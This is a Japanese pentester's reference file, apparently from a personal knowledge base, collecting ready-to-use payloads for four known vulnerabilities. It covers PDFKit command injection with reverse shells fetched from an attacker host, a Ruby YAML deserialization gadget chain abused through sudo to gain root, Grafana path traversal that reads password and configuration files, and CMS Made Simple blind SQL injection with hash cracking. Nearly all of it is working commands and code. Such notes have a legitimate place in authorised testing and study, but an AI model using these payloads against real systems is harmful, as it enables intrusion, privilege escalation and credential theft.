# CVE メモ — 具体的ペイロード・バージョン対応表

汎用手法ファイル（`02_Initial_Access/` / `03_Post_Access_Linux/` 等）には書かない、
**特定のソフトウェア × バージョン限定の具体的ペイロード**をここに集約する。

手法クラスの「シグナル → 次の動作」は各手法ファイルを参照し、
ペイロードの詳細が必要になったときにここを開く。

---

## インデックス

| CVE | 対象 | 影響バージョン | 手法クラス | 参照先（手法ファイル） |
|-----|------|--------------|-----------|------------------|
| CVE-2022-25765 | PDFKit (Ruby gem) | 0.8.6 以下 | URL パラメータへのバックティック注入 → RCE | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
| Ruby YAML.load Psych Gadget Chain | Ruby 標準ライブラリ (Psych) | Ruby 2.x〜3.0 / `YAML.load` 使用時 | sudo スクリプト経由デシリアライゼーション → root RCE | `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5） |
| CVE-2021-43798 | Grafana | 8.0.0 〜 8.3.0 | プラグイン経由のパストラバーサル → 任意ファイル読取 | `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md` |
| CVE-2019-9053 | CMS Made Simple | ≤ 2.2.9 | タイムベースブラインド SQLi → ハッシュ抽出 | `../02_Initial_Access/Web_Vulnerabilities/SQLi.md` |

---

## CVE-2022-25765 — PDFKit バックティック URL 注入

**対象:** PDFKit gem 0.8.6 以下  
**手法クラス:** OSコマンドインジェクション（URL パラメータ経由）  
**参照:** `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`（PDF生成機能のコマンドインジェクション セクション）

### ペイロード

**事前準備（必須）：**
1. リバースシェルスクリプトを HTTP サーバーで配信できる状態にする
2. nc リスナーを起動しておく

```bash
# [Attacker] Step 1: リバースシェルスクリプトを作成
mkdir -p /tmp/www
cat > /tmp/www/rev.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
EOF

# [Attacker] Step 2: HTTP サーバー起動（スクリプト配信用）
cd /tmp/www
python3 -m http.server 8090

# [Attacker] Step 3: 別ターミナルで nc リスナー起動
nc -lvnp 4444
```

**ブラウザの URL 入力フォームに貼り付けるペイロード:**
```
http://[ATTACKER_IP]:8090/?name= `curl http://[ATTACKER_IP]:8090/rev.sh|bash`
```

**curl で POST する場合（URL エンコード済み）:**
```bash
# [Attacker]
curl -X POST http://[TARGET]/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'url=http%3A%2F%2F[ATTACKER_IP]%3A8090%2F%3Fname%3D%2520%60curl%20http%3A%2F%2F[ATTACKER_IP]%3A8090%2Frev.sh%7Cbash%60'
```

**[ATTACKER_IP] にはテスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う（`ip a` で全インターフェース確認）。**

---

### URL 検証バイパス（"You should provide a valid URL!" が返る場合）

アプリ側が URL を検証しており、バックティックのみの入力（例: `` http%20`sleep 5` ``）を弾いてくる場合がある。

**症状：** フォームに `` http%20`sleep 5` `` を送ると "You should provide a valid URL!" などのエラーが返る。

**バイパスの原理：** 多くの URL バリデーションは `scheme://host` の形式が整っているかだけを見る。`%20`（スペースの URL エンコード）をパスまたはクエリパラメータ区切りとして挟むことで、バックティックを「URLの続き」として扱わせつつ、ライブラリにはコマンドとして解釈させられる。

**バイパス形式（テスター管理のサーバーを経由する方法）：**

```
http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/test`
```

- `http://[ATTACKER_IP]:[PORT]/` → バリデーションが通る valid な URL
- `%20` → URL エンコードされたスペース（パスの一部として扱われる）
- `` `curl ...` `` → pdfkit がシェルに渡す際にコマンドとして解釈される

**事前確認（OOB で RCE を確認する手順）：**

```bash
# [Attacker] Step 1: HTTP サーバーを起動してコールバックを待つ
python3 -m http.server [PORT]

# [Attacker] Step 2: フォームに以下を入力して送信
# http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/probe`

# → HTTP サーバーのログに GET /probe が届けば RCE 確定
```

---

### base64 エンコードペイロード（特殊文字・クォートが問題になる場合）

リバースシェルペイロードにシングルクォート・スペース等の特殊文字が含まれると、URL や POST ボディの中でエスケープが崩れることがある。base64 でエンコードしてからデコード＋実行することで回避できる。

**事前準備（必須）：**

```bash
# [Attacker] Step 1: リバースシェルコマンドを base64 エンコード
# Ruby の場合
echo -n "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"[ATTACKER_IP]\",[PORT]))'" | base64 -w 0
# → [BASE64_STRING] が出力される

# bash の場合
echo -n 'bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1' | base64 -w 0
# → [BASE64_STRING] が出力される

# [Attacker] Step 2: nc リスナーを起動
nc -lvnp [PORT]
```

**フォームへの入力（バイパス形式と組み合わせる）：**

```
http://[ATTACKER_IP]:[PORT]/%20`echo [BASE64_STRING] | base64 -d | bash`
```

**ポイント：**
- バックエンドが Ruby なら Ruby ペイロードを選ぶ（`ruby -rsocket ...`）。bash が使えない環境でも Ruby は動くため、言語を合わせることで成功率が上がる
- `-w 0` オプションは base64 出力の改行を抑制する（改行があるとデコードが失敗する）
- base64 文字列自体はシェルメタ文字を含まないため、URL パラメータ内でエスケープの問題が発生しない

### 確認されたバージョン
- PDFKit 0.8.6（Debian Bullseye / Ruby 2.7 環境で確認）
- PDFKit 0.8.7 以降はパッチ済み（URL サニタイズ修正）

---

## Ruby YAML.load Psych Gadget Chain — sudo スクリプト経由 root RCE

**対象:** Ruby 2.x〜3.0 / `YAML.load` を使うスクリプトを sudo NOPASSWD で実行できる環境  
**手法クラス:** デシリアライゼーション悪用（sudo 設定不備）  
**参照:** `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン5）  
**原理:** `../06_Concepts/YAML_Deserialization.md`

### ペイロード（悪意ある YAML ファイル）

**事前準備（必須）：**
- スクリプトが読み込むファイル名を `cat [スクリプトパス]` で確認する（例: `dependencies.yml`）
- そのファイルが置かれるパス（相対パスならカレントディレクトリ）に書き込み権限があることを確認する
- ファイルを作成するディレクトリに移動してから以下を実行する

```bash
# [Target] ファイル名はスクリプトの YAML.load 引数に合わせて変更する
# 'EOF' をシングルクォートで囲むことでヒアドキュメント内の ! が展開されない
cat << 'EOF' > [スクリプトが読み込むファイル名]
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: x
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/object:Gem::Installer
                     i: x
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
EOF
```

**`git_set:` の値が実行されるコマンド。** 目的に応じて変更する：

| やりたいこと | git_set の値 |
|------------|-------------|
| /bin/bash に SUID を設定（最もシンプル） | `"chmod +s /bin/bash"` |
| /tmp に SUID bash をコピー | `"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"` |
| sudoers に追記（永続的） | `"echo '[USER] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"` |

**sudo 実行:**
```bash
# [Target] エラーが出ても途中でコマンドが走ることがある
sudo /usr/bin/ruby [スクリプトパス]

# SUID が設定されたか確認
ls -la /bin/bash
# -rwsr-sr-x ... → 成功

# root として実行
/bin/bash -p
```

**原状回復（必須）:**
```bash
# [Target] SUID を元に戻す
chmod -s /bin/bash

# 作成した YAML ファイルを削除
rm [ファイル名]
```

### 確認されたバージョン
- Ruby 2.7.4 / Rubygems 3.x（Debian Bullseye 環境で確認）
- Ruby 3.1 以降は `YAML.load` がデフォルトで安全なロードに変更されているため**動作しない**
  → `ruby --version` で確認してから試す

---

## CVE-2021-43798 — Grafana プラグイン経由パストラバーサル

**対象:** Grafana 8.0.0 〜 8.3.0
**手法クラス:** パストラバーサル（Webルート外ファイル読取）
**参照:** `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`

### バージョン確認

```bash
# [Attacker]
curl -s http://[IP]:[PORT]/api/health
# {"commit":"...","database":"ok","version":"8.0.0"}
```

→ `version` が `8.0.0` 〜 `8.3.0` の範囲なら有効。`8.3.1` 以降はパッチ済み。

### ペイロード

プラグイン名は何でもよい（`alertlist`, `text`, `graph`, `table` など、インストール済みプラグインならいずれでも可）。

```bash
# [Attacker] /etc/passwd を取得
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/passwd"

# [Attacker] /etc/hosts を取得（コンテナか否かの確認）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/hosts"

# [Attacker] Grafana SQLite データベース取得
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db

# [Attacker] Grafana 設定ファイル取得（secret_key 等が含まれる）
curl -s --path-as-is \
  "http://[IP]:[PORT]/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini" \
  -o grafana.ini
```

### SQLite データベースからのハッシュ抽出

```bash
# [Attacker] ユーザーテーブルを抽出（CLI）
sqlite3 grafana.db "SELECT id, name, login, email, password, salt FROM user;"

# 出力例:
# 1||admin|admin@localhost|[HEX_HASH]|[SALT]
# 2|[USER]|[USER]|user@domain.local|[HEX_HASH]|[SALT]
```

> GUI ツールとして `sqlitebrowser`（DB Browser for SQLite）でも同様に参照できる。Table: `user` → Browse Data タブ。オフライン・CLI 環境では `sqlite3` を使う。

> `rands` カラムは変換不要。Hashcat 変換に必要なのは `password`（HEX）と `salt` のみ。

→ 取得したハッシュのクラック: `Hashcat.md`（PBKDF2-HMAC-SHA256 / mode 10900）

### 確認されたバージョン
- Grafana 8.3.0（脆弱版）
- Grafana 8.3.1 以降はパッチ済み

---

## CVE-2019-9053 — CMS Made Simple タイムベースブラインド SQLi

**対象:** CMS Made Simple ≤ 2.2.9
**手法クラス:** タイムベースブラインド SQLi（ソルト + MD5 ハッシュ抽出）
**参照:** `../02_Initial_Access/Web_Vulnerabilities/SQLi.md`（タイムベースブラインドSQLi セクション）

### エクスプロイトの取得

```bash
# [Attacker]
searchsploit cms made simple
searchsploit -m php/webapps/46635.py
```

### Python 2系スクリプトを Python 3 で動かす手順

1. `searchsploit -m [PATH]` でスクリプトをカレントディレクトリにコピー
2. `python [script.py]` を実行してエラー確認
3. エラーが出た場合は以下の箇所を修正：
   - `print "..."` → `print("...")`
   - `hashlib.md5(str(salt) + word)` → `hashlib.md5((salt + word).encode()).hexdigest()`
4. 修正後に再実行

### ペイロード構造（タイムベース文字抽出）

抽出の優先順位はソルト → ユーザー名 → メール → パスワードハッシュ。多くのWebアプリは `md5(salt + password)` を使うため、ソルトなしではクラック不可。

```
# ソルト抽出ペイロード例（cms_siteprefs テーブルの sitepref_value から sitemask 行を1文字ずつ抽出）
a,b,1,5))+and+(select+sleep(3)+from+cms_siteprefs+where+sitepref_value+like+0x[HEX_PREFIX]25+and+sitepref_name+like+0x736974656d61736b)+--+
```

### 手動でのタイムベース SQLi 確認

```bash
# [Attacker] 脆弱性の存在確認（3秒遅延するか）
curl -s "http://[TARGET]/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))+--+" \
  -o /dev/null -w "%{time_total}\n"
# 3秒以上かかれば SQLi 成立
```

### Python でのパスワードクラック（ソルト付き MD5）

```python
# [Attacker] テスター端末で実行
import hashlib

salt   = "[取得したソルト]"
hash_  = "[取得したMD5ハッシュ]"

with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
    for line in f:
        word = line.strip()
        if hashlib.md5((salt + word).encode()).hexdigest() == hash_:
            print(f"[+] パスワード: {word}")
            break
```

### 注意点・落とし穴
- **DoS保護があるサイトではリクエスト間に遅延を入れる**（`time.sleep(0.5)` 程度）。連続リクエストで接続が切られると抽出が止まる
- スリープ閾値（TIME変数）は環境のレイテンシに合わせて調整。レイテンシが200ms以上なら `TIME=5` 程度に上げる
- 文字セット（dictionary）に不足があると1文字も抽出されずに終わる。エラーなく空文字が返る場合は文字セットを確認
- Python 2 系のエクスプロイトは `hashlib.md5(str(salt) + word)` でバイト/文字列の混在エラーが出る。Python 3 では `.encode()` が必要
- 一部の CMS はセッション管理があり、Cookie なしではクエリが実行されない場合がある

### 確認されたバージョン
- CMS Made Simple 2.2.9 以下が対象
- 2.2.10 以降はパッチ済み
